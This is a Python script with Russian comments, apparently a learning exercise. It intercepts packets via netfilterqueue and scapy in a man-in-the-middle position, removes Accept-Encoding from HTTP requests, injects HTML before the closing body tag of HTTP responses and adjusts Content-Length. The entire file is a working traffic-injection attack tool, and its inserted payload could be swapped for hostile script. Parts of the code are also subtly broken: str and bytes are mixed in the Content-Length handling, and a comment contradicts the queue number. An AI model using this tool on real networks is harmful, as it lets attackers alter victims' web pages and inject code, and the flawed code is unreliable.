
import netfilterqueue
import scapy.all as scapy
# для вывода регулярных 
import re

# фун удаления не нужных данных 
def set_load(packet, load):
    packet[scapy.Raw].load = load 
    # удаляем строки отвеч за разрмер пакета, длину 
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# фун перебора
def  proccess_packet(packet):
    # через скапи с помщью нэта мы можем получить теже строки но потом будем изменять
    scapy_pack = scapy.IP(packet.get_payload())
    # проверяем назанчение sport получаем htttp  dport отправлем
    if scapy_pack.haslayer(scapy.Raw):#проверяем на HTTP запросы
        # создадим переменную load
        load = scapy_pack[scapy.Raw].load
        # проверяем порты на выход
        if scapy.TCP in scapy_pack and scapy_pack[scapy.TCP].dport == 80:
            print("HTTP запрос")
            # делаем замену в load для вывода html убирая шифрования кода
            load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", load)#укз на что и какую строку
 
        elif scapy.TCP in scapy_pack and scapy_pack[scapy.TCP].sport == 80:
            print("HTTP ответ")
            # создаем переменную для вставки кода
            code = b"<h1>HELLO</h1>"
            # делаем замену
            load = load.replace(b"</body>", code + b"</body>") 
            # print(scapy_pack.show())
            # переменная длины
            content_length_search = re.search(b"(?:Content-Length:\s)(\d*)", load)#укз что нужно захватить и что убрать также укз где искать
            # создаем поиск cont для того чтобы изменить заначения длины стр также добавим чтобы убрать bad response 
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)#укз возврат 0 - это вернет все 1 -только цифры из-за изменения в регулярном вырожении
                # переменная новая с длинной
                new_content = int(content_length) + len(code)
                # создаем новые число переводя в строку
                load = load.replace(content_length, str(new_content))
        
        # создад новую фун для того чтобы не повторять код с выводом байтов
        if load != scapy_pack[scapy.Raw].load:
            # теперь вызываем фун которая удаляет вставляя нужные нам переменные
            new_pack = set_load(scapy_pack, load)
            # переводим в строку чтобы файлы стали читаемы для ответа
            packet.set_payload(bytes(new_pack))#теперь все вернется клиенту правильно
    
    
    # для разрешения передачи
    packet.accept()
    
    # для запрета
    # packet.drop()

#переменная для пакетов 
queue = netfilterqueue.NetfilterQueue()
# перебор пакетов в 0 где обозначали хранение.
queue.bind(1, proccess_packet)
queue.run()
